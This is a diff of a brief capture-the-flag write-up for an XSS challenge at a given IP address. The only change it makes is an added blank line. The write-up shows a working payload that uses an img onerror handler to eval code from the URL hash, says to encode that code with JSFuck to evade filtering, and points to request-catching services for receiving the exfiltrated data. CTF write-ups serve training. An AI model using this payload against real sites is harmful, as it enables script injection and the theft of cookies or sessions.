@@ -1,6 +1,7 @@
 **Challenge:** http://159.65.249.122:4111/
 
 Payload: `http://159.65.249.122:4111/?<img src onerror =eval(unescape(eval(location.hash.substr(1))))>#<JS code>`
+
 Ps: `location.hash.substr(1)` has to be encoded using [JSFuck](http://www.jsfuck.com/) (uncheck `Eval source` option)
 
 Create an HTTP server or you can use some online solutions like https://webhook.site/ or https://requestbin.com/.
